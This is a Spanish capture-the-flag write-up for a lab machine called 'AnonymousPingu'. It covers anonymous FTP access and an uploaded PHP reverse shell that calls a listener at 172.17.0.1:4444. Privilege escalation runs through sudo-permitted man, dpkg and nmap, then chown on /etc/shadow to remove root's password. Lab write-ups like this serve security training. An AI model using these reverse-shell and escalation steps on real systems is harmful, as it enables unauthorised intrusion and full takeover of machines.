---
description: '🧠Dificultad: Fácil | 🔓31/08/2025'
---

# AnonymousPingu

## 🕵️ Reconocimiento

El escaneo de puertos nos dice que hay un servicio FTP con login anónimo, y un servicio HTTP :

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

En el servicio FTP se encuentran los archivos utilizados para el servicio web. La carpeta `upload` está habilitada para subir contenido. Además, si accedemos a este directorio desde el servicio web, nos encontramos con un `directory indexing`.

<div align="left"><figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure></div>

## 🚪 Ganando acceso

Probamos a subir una reverse shell en PHP a la carpeta `upload` por FTP.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"); ?>
```

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalando privilegios

Si comprobamos los permisos que tenemos con `sudo`, vemos que podemos ejecutar el binario `man` como `pingu` sin necesidad de contraseña.

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

En [gtfobins](https://gtfobins.github.io/gtfobins/man/) vemos que podemos explotar esta configuración para obtener una shell con el usuario `pingu`. Antes de mostrar la explotación de esta configuración, cabe destacar que es necesario mejorar la shell con los siguientes comandos:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Suspendemos la terminal con CTRL + Z
stty raw -echo; fg
reset
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Del mismo modo, con `sudo -l` vemos que podemos ejecutar el binario `dpkg` y `nmap` como `gladys` sin contraseña. Usamos el exploit de gtfobins:

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Una vez dentro como gladys, vemos de nuevo que tenemos permisos para ejecutar como `root` el binario `chown` . Esto nos hace poder cambiar el propietario y grupo del fichero que queramos. Si nos hacemos dueños del fichero `/etc/shadow`, podemos mirar posibles contraseñas o escribirlas:

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Modificando el fichero, podemos dejar sin contraseña al usuario `root`.

<div align="left"><figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure></div>
